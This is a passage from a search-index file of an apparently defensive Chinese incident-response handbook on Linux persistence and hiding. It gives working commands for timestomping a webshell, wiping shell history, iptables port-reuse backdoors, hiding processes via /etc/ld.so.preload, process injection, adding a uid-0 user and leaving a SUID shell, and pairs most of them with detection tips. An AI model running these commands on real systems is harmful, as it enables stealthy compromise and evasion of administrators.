\u9a8c\u8bc1\u8fdb\u7a0b\u6ce8\u5165\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a Cymothoa\u662f\u4e00\u6b3e\u9690\u79d8\u7684\u540e\u95e8\u5de5\u5177\u3002\u5b83\u901a\u8fc7\u5411\u76ee\u6807\u4e3b\u673a\u6d3b\u8dc3\u7684\u8fdb\u7a0b\u6ce8\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u83b7\u53d6\u548c\u539f\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u3002\u8be5\u5de5\u5177\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/ # \u4e0b\u8f7d\u89e3\u538b wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta && make 0x07 \u7ed3\u8bed \u00b6 \u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Linux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u6743\u9650\u3001\u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u9690\u85cf\u7b49\u65b9\u9762\u7684\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002","title":"\u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x00-\u524d\u8a00","text":"\u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u4f1a\u901a\u8fc7\u4e00\u4e9b\u6280\u5de7\u6765\u9690\u85cf\u81ea\u5df1\u7684\u8e2a\u8ff9\u548c\u540e\u95e8\u6587\u4ef6\uff0c\u672c\u6587\u4ecb\u7ecdLinux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x01-\u9690\u85cf\u6587\u4ef6","text":"Linux \u4e0b\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\uff1a touch .test.txt touch \u547d\u4ee4\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u524d\u9762\u52a0\u4e00\u4e2a \u70b9 \u5c31\u4ee3\u8868\u662f\u9690\u85cf\u6587\u4ef6,\u5982\u4e0b\u56fe\uff1a \u4e00\u822c\u7684Linux\u4e0b\u7684\u9690\u85cf\u76ee\u5f55\u4f7f\u7528\u547d\u4ee4 ls -l \u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u53ea\u80fd\u67e5\u770b\u5230\u6587\u4ef6\u53ca\u6587\u4ef6\u5939\uff0c\u67e5\u770bLinux\u4e0b\u7684\u9690\u85cf\u6587\u4ef6\u9700\u8981\u7528\u5230\u547d\u4ee4\uff1a ls -al \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728/tmp\u4e0b\uff0c\u9ed8\u8ba4\u5b58\u5728\u591a\u4e2a\u9690\u85cf\u76ee\u5f55\uff0c\u8fd9\u4e9b\u76ee\u5f55\u662f\u6076\u610f\u6587\u4ef6\u5e38\u7528\u6765\u85cf\u8eab\u7684\u5730\u65b9\u3002\u5982 /temp/.ICE-unix/\u3001/temp/.Test-unix/\u3001/temp/.X11-unix/\u3001/temp/.XIM-unix/","title":"0x01 \u9690\u85cf\u6587\u4ef6"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x02-\u9690\u85cf\u6587\u4ef6\u65f6\u95f4\u6233","text":"Unix \u4e0b\u85cf\u540e\u95e8\u5fc5\u987b\u8981\u4fee\u6539\u65f6\u95f4\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u76f4\u63a5\u5229\u7528 touch \u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982\u53c2\u8003 index.php \u7684\u65f6\u95f4\uff0c\u518d\u8d4b\u7ed9 webshell.php\uff0c\u7ed3\u679c\u4e24\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u5c31\u4e00\u6837\u4e86\u3002 \u5229\u7528\u65b9\u6cd5 touch -r index.php webshell.php \u6216\u8005\u76f4\u63a5\u5c06\u65f6\u95f4\u6233\u4fee\u6539\u6210\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\u3002\u5982\u4e0b 2014 \u5e74 01 \u6708 02 \u65e5\u3002 touch -t 1401021042.30 webshell.php","title":"0x02 \u9690\u85cf\u6587\u4ef6\u65f6\u95f4\u6233"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x03-\u9690\u85cf\u6743\u9650","text":"\u5728Linux\u4e2d\uff0c\u4f7f\u7528chattr\u547d\u4ee4\u6765\u9632\u6b62root\u548c\u5176\u4ed6\u7ba1\u7406\u7528\u6237\u8bef\u5220\u9664\u548c\u4fee\u6539\u91cd\u8981\u6587\u4ef6\u53ca\u76ee\u5f55\uff0c\u6b64\u6743\u9650\u7528ls -l\u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u6743\u9650\u7684\u76ee\u7684\u3002 \u8fd9\u4e2a\u6280\u5de7\u5e38\u88ab\u7528\u5728\u540e\u95e8\uff0c\u53d8\u6210\u4e86\u4e00\u4e9b\u96be\u4ee5\u6e05\u9664\u7684\u540e\u95e8\u6587\u4ef6\uff0c\u4ee4\u5f88\u591a\u65b0\u624b\u670b\u53cb\u611f\u5230\u5934\u75bc\u3002 chattr +i evil.php \u9501\u5b9a\u6587\u4ef6 lsattr evil.php \u5c5e\u6027\u67e5\u770b chattr -i evil.php \u89e3\u9664\u9501\u5b9a rm -rf 1.evil.php \u5220\u9664\u6587\u4ef6","title":"0x03 \u9690\u85cf\u6743\u9650"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x04-\u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4","text":"\u5728shell\u4e2d\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e0d\u5e0c\u671b\u88ab\u8bb0\u5f55\u5728\u547d\u4ee4\u884c\u5386\u53f2\u4e2d\uff0c\u5982\u4f55\u5728linux\u4e2d\u5f00\u542f\u65e0\u75d5\u64cd\u4f5c\u6a21\u5f0f\u5462\uff1f \u6280\u5de7\u4e00\uff1a\u53ea\u9488\u5bf9\u4f60\u7684\u5de5\u4f5c\u5173\u95ed\u5386\u53f2\u8bb0\u5f55 [space]set +o history \u5907\u6ce8\uff1a[space] \u8868\u793a\u7a7a\u683c\u3002\u5e76\u4e14\u7531\u4e8e\u7a7a\u683c\u7684\u7f18\u6545\uff0c\u8be5\u547d\u4ee4\u672c\u8eab\u4e5f\u4e0d\u4f1a\u88ab\u8bb0\u5f55\u3002 \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u4e34\u65f6\u7981\u7528\u5386\u53f2\u529f\u80fd\uff0c\u8fd9\u610f\u5473\u7740\u5728\u8fd9\u547d\u4ee4\u4e4b\u540e\u4f60\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u8bb0\u5f55\u5230\u5386\u53f2\u4e2d\uff0c\u7136\u800c\u8fd9\u4e2a\u547d\u4ee4\u4e4b\u524d\u7684\u6240\u6709\u4e1c\u897f\u90fd\u4f1a\u539f\u6837\u8bb0\u5f55\u5728\u5386\u53f2\u5217\u8868\u4e2d\u3002 \u8981\u91cd\u65b0\u5f00\u542f\u5386\u53f2\u529f\u80fd\uff0c\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a [Space]set -o history \u5b83\u5c06\u73af\u5883\u6062\u590d\u539f\u72b6\uff0c\u4e5f\u5c31\u662f\u4f60\u5b8c\u6210\u4e86\u4f60\u7684\u5de5\u4f5c\uff0c\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u4e4b\u540e\u7684\u547d\u4ee4\u90fd\u4f1a\u51fa\u73b0\u5728\u5386\u53f2\u4e2d\u3002 \u6280\u5de7\u4e8c\uff1a\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u6307\u5b9a\u7684\u547d\u4ee4 \u5047\u8bbe\u5386\u53f2\u8bb0\u5f55\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u4e00\u4e9b\u4f60\u4e0d\u5e0c\u671b\u8bb0\u5f55\u7684\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u600e\u4e48\u529e\uff1f\u5f88\u7b80\u5355\u3002\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u5220\u9664\uff1a history | grep \"keyword\" \u8f93\u51fa\u5386\u53f2\u8bb0\u5f55\u4e2d\u5339\u914d\u7684\u547d\u4ee4\uff0c\u6bcf\u4e00\u6761\u524d\u9762\u4f1a\u6709\u4e2a\u6570\u5b57\u3002\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u90a3\u4e2a\u6307\u5b9a\u7684\u9879\uff1a history -d [num] \u8fd9\u79cd\u6280\u5de7\u662f\u5173\u952e\u8bb0\u5f55\u5220\u9664\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u70b9\uff0c\u6bd4\u5982\u524d150\u884c\u662f\u7528\u6237\u7684\u6b63\u5e38\u64cd\u4f5c\u8bb0\u5f55\uff0c150\u4ee5\u540e\u662f\u653b\u51fb\u8005\u64cd\u4f5c\u8bb0\u5f55\u3002\u6211\u4eec\u53ef\u4ee5\u53ea\u4fdd\u7559\u6b63\u5e38\u7684\u64cd\u4f5c\uff0c\u5220\u9664\u653b\u51fb\u75d5\u8ff9\u7684\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ea\u4fdd\u7559\u524d150\u884c\uff1a sed -i '150,$d' .bash_history","title":"0x04 \u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x05-\u9690\u85cf\u8fdc\u7a0bssh\u767b\u9646\u8bb0\u5f55","text":"","title":"0x05 \u9690\u85cf\u8fdc\u7a0bSSH\u767b\u9646\u8bb0\u5f55"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#\u9690\u8eab\u767b\u5f55\u7cfb\u7edf\u4e0d\u4f1a\u88abwwholast\u7b49\u6307\u4ee4\u68c0\u6d4b\u5230","text":"ssh -T root@127.0.0.1 /bin/bash -i \u4e0d\u8bb0\u5f55ssh\u516c\u94a5\u5728\u672c\u5730.ssh\u76ee\u5f55\u4e2d ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash \u2013i","title":"\u9690\u8eab\u767b\u5f55\u7cfb\u7edf\uff0c\u4e0d\u4f1a\u88abw\u3001who\u3001last\u7b49\u6307\u4ee4\u68c0\u6d4b\u5230\u3002"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x06-\u7aef\u53e3\u590d\u7528","text":"\u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Linux\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u7b2c\u4e00\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7SSLH\u5728\u540c\u4e00\u7aef\u53e3\u4e0a\u5171\u4eabSSH\u4e0eHTTPS #\u5b89\u88c5SSLH sudo apt-get install sslh #\u914d\u7f6eSSLH \u7f16\u8f91 SSLH \u914d\u7f6e\u6587\u4ef6\uff1a sudo vi /etc/default/sslh 1\u3001\u627e\u5230\u4e0b\u5217\u884c\uff1aRun=no \u5c06\u5176\u4fee\u6539\u4e3a\uff1aRun=yes 2\u3001\u4fee\u6539\u4ee5\u4e0b\u884c\u4ee5\u5141\u8bb8 SSLH \u5728\u6240\u6709\u53ef\u7528\u63a5\u53e3\u4e0a\u4fa6\u542c\u7aef\u53e3 443 DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\" \u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff1a\u5229\u7528IPTables\u8fdb\u884c\u7aef\u53e3\u590d\u7528 # \u7aef\u53e3\u590d\u7528\u94fe iptables -t nat -N LETMEIN # \u7aef\u53e3\u590d\u7528\u89c4\u5219 iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 # \u5f00\u542f\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT # \u5173\u95ed\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT # let's do it iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN \u5229\u7528\u65b9\u5f0f\uff1a #\u5f00\u542f\u590d\u7528 echo threathuntercoming | socat - tcp:192.168.28.128:80 #ssh\u4f7f\u752880\u7aef\u53e3\u8fdb\u884c\u767b\u5f55 ssh -p 80 root@192.168.28.128 #\u5173\u95ed\u590d\u7528 echo threathunterleaving | socat - tcp:192.168.28.128:80 \u5177\u4f53\u6587\u7ae0\u8be6\u89c1\uff1a \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528","title":"0x06 \u7aef\u53e3\u590d\u7528"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x07-\u8fdb\u7a0b\u9690\u85cf","text":"\u7ba1\u7406\u5458\u65e0\u6cd5\u901a\u8fc7\u76f8\u5173\u547d\u4ee4\u5de5\u5177\u67e5\u627e\u5230\u4f60\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u76ee\u7684\uff0c\u5b9e\u73b0\u8fdb\u7a0b\u9690\u85cf\u3002 \u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1alibprocesshider github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gianlucaborello/libprocesshider \u5229\u7528 LD_PRELOAD \u6765\u5b9e\u73b0\u7cfb\u7edf\u51fd\u6570\u7684\u52ab\u6301\uff0c\u5b9e\u73b0\u5982\u4e0b # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ && make # \u79fb\u52a8\u6587\u4ef6\u5230/usr/local/lib/\u76ee\u5f55\u4e0b cp libprocesshider.so /usr/local/lib/ # \u628a\u5b83\u52a0\u8f7d\u5230\u5168\u5c40\u52a8\u6001\u8fde\u63a5\u5c40 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload \u6d4b\u8bd5\uff1a\u8fd0\u884c evil_script.py\uff0c \u6b64\u65f6\u53d1\u73b0\u5728top \u4e0e ps \u4e2d\u90fd\u65e0\u6cd5\u627e\u5230 evil_script.py\uff0c cpu \u4f7f\u7528\u7387\u9ad8,\u4f46\u662f\u5374\u627e\u4e0d\u5230\u4efb\u4f55\u5360\u7528cpu\u9ad8\u7684\u7a0b\u5e8f\u3002 \u5982\u4f55\u5728Linux\u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\uff0c unhide \u662f\u4e00\u4e2a\u5c0f\u5de7\u7684\u7f51\u7edc\u53d6\u8bc1\u5de5\u5177\uff0c\u80fd\u591f\u53d1\u73b0\u90a3\u4e9b\u501f\u52a9rootkit\uff0cLKM\u53ca\u5176\u5b83\u6280\u672f\u9690\u85cf\u7684\u8fdb\u7a0b\u548cTCP / UDP\u7aef\u53e3\u3002\u8fd9\u4e2a\u5de5\u5177\u5728Linux\uff0cUNIX\u7c7b\uff0cMS-Windows\u7b49\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u90fd\u53ef\u4ee5\u5de5\u4f5c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.unhide-forensics.info/ # \u5b89\u88c5 sudo yum install unhide # \u4f7f\u7528 unhide [options] test_list \u4f7f\u7528 unhide proc \u53d1\u73b0\u9690\u85cf\u8fdb\u7a0bevil_script.py\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u8fdb\u7a0b\u6ce8\u5165\u5de5\u5177linux-inject linux-inject\u662f\u7528\u4e8e\u5c06\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165Linux\u8fdb\u7a0b\u7684\u5de5\u5177 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gaffe23/linux-inject.git # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject && make # \u6d4b\u8bd5\u8fdb\u7a0b ./sample-target # \u8fdb\u7a0b\u6ce8\u5165 ./inject -n sample-target sample-library.so \u9a8c\u8bc1\u8fdb\u7a0b\u6ce8\u5165\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a Cymothoa\u662f\u4e00\u6b3e\u9690\u79d8\u7684\u540e\u95e8\u5de5\u5177\u3002\u5b83\u901a\u8fc7\u5411\u76ee\u6807\u4e3b\u673a\u6d3b\u8dc3\u7684\u8fdb\u7a0b\u6ce8\u5165\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u83b7\u53d6\u548c\u539f\u8fdb\u7a0b\u76f8\u540c\u7684\u6743\u9650\u3002\u8be5\u5de5\u5177\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4e0d\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\uff0c\u4e0d\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/ # \u4e0b\u8f7d\u89e3\u538b wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta && make","title":"0x07 \u8fdb\u7a0b\u9690\u85cf"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x07-\u7ed3\u8bed","text":"\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Linux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u6743\u9650\u3001\u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u9690\u85cf\u7b49\u65b9\u9762\u7684\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002","title":"0x07 \u7ed3\u8bed"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87/","text":"\u672c\u6587\u5c06\u5bf9Linux\u4e0b\u5e38\u89c1\u7684\u6743\u9650\u7ef4\u6301\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u767e\u6218\u4e0d\u6b86\u3002 1\u3001\u4e00\u53e5\u8bdd\u6dfb\u52a0\u7528\u6237\u548c\u5bc6\u7801 \u6dfb\u52a0\u666e\u901a\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684\u666e\u901a\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p \u65b9\u6cd5 ` ` \u662f\u7528\u6765\u5b58\u653e\u53ef\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4,\"$()\"\u4e5f\u53ef\u4ee5\u5b58\u653e\u547d\u4ee4\u6267\u884c\u8bed\u53e5 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd\u65b9\u6cd5 useradd guest;echo 'guest:123456'|chpasswd # echo -e\u65b9\u6cd5 useradd test;echo -e \"123456\\n123456\\n\" |passwd test \u6dfb\u52a0root\u7528\u6237\uff1a # \u521b\u5efa\u4e00\u4e2a\u7528\u6237\u540dguest\uff0c\u5bc6\u7801123456\u7684root\u7528\u6237 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test \u53ef\u7591\u7528\u6237\u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd # \u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow # \u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 2\u3001SUID Shell Suid shell\u662f\u4e00\u79cd\u53ef\u7528\u4e8e\u4ee5\u62e5\u6709\u8005\u6743\u9650\u8fd0\u884c\u7684shell\u3002 \u914d\u5408\u666e\u901a\u7528\u6237\u6743\u9650\u4f7f\u7528 cp /bin/bash /tmp/shell chmod u+s /tmp/shell \u4f7f\u7528guest\u7528\u6237\u767b\u5f55\u5c31\u53ef\u7591\u83b7\u53d6root\u6743\u9650\u3002 \u5907\u6ce8\uff1abash2\u9488\u5bf9suid\u505a\u4e86\u4e00\u4e9b\u9632\u62a4\u63aa\u65bd\uff0c\u9700\u8981\u4f7f\u7528-p\u53c2\u6570\u6765\u83b7\u53d6\u4e00\u4e2aroot shell\u3002\u53e6\u5916\uff0c\u666e\u901a\u7528\u6237\u6267\u884c\u8fd9\u4e2aSUID shell\u65f6\uff0c\u4e00\u5b9a\u8981\u4f7f\u7528\u5168\u8def\u5f84\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u5728Linux\u4e2d\u67e5\u627eSUID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /4000 # \u5728Linux\u4e2d\u67e5\u627e\u4f7f\u7528SGID\u8bbe\u7f6e\u7684\u6587\u4ef6 find . -perm /2000 # \u53d6\u6d88s\u6743\u9650 chmod u-s /tmp/shell 3\u3001ssh\u516c\u79c1\u94a5\u514d\u5bc6\u767b\u5f55 \u5728\u5ba2\u6237\u7aef\u4e0a\u751f\u6210\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7136\u540e\u628a\u516c\u94a5\u653e\u5230\u670d\u52a1\u5668\u4e0a\uff08~/.ssh/authorized_keys\uff09\uff0c\u4fdd\u7559\u79c1\u94a5\u3002\u5f53ssh\u767b\u5f55\u65f6\uff0cssh\u7a0b\u5e8f\u4f1a\u53d1\u9001\u79c1\u94a5\u53bb\u548c\u670d\u52a1\u5668\u4e0a\u7684\u516c\u94a5\u505a\u5339\u914d\u3002\u5982\u679c\u5339\u914d\u6210\u529f\u5c31\u53ef\u4ee5\u767b\u5f55\u4e86\u3002 \u5ba2\u6237\u7aef\uff1a ssh-keygen -t rsa \u8fc7\u7a0b\u4e2d\u6309\u4e09\u6b21\u56de\u8f66\uff0c\u6267\u884c\u7ed3\u675f\u5982\u4e0b\u56fe: \u8fdb\u5165/root/.ssh/\u6587\u4ef6\u5939\uff0c\u67e5\u770b\u6587\u4ef6\u5939\u7684\u5185\u5bb9\uff0c\u5982\u4e0b\u6240\u793a\uff1a \u5176\u4e2d id_rsa \u4e3a\u79c1\u94a5\uff0c id_rsa.pub \u4e3a\u516c\u94a5\uff0c\u63a5\u4e0b\u6765\u6253\u5f00 id_rsa.pub \uff0c\u5c06\u5185\u5bb9\u590d\u5236\u5230\u670d\u52a1\u5668\u3002\u5c06 id_rsa.pub \u7684\u5185\u5bb9\u8ffd\u52a0\u5230 /root/.ssh/authorized_keys \u5185\uff0c\u914d\u7f6e\u5b8c\u6210\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b /root/.ssh/authorized_keys \u662f\u5426\u88ab\u4fee\u6539\u3002 4\u3001\u8f6f\u8fde\u63a5 \u5728sshd\u670d\u52a1\u914d\u7f6e\u8fd0\u884cPAM\u8ba4\u8bc1\u7684\u524d\u63d0\u4e0b\uff0cPAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u63a7\u5236\u6807\u5fd7\u4e3asufficient\u65f6\u53ea\u8981pam_rootok\u6a21\u5757\u68c0\u6d4buid\u4e3a0\u5373root\u6743\u9650\u5373\u53ef\u6210\u529f\u8ba4\u8bc1\u767b\u9646\u3002\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u65b9\u5f0f\uff0c\u5b9e\u8d28\u4e0aPAM\u8ba4\u8bc1\u662f\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u6587\u4ef6\u540d 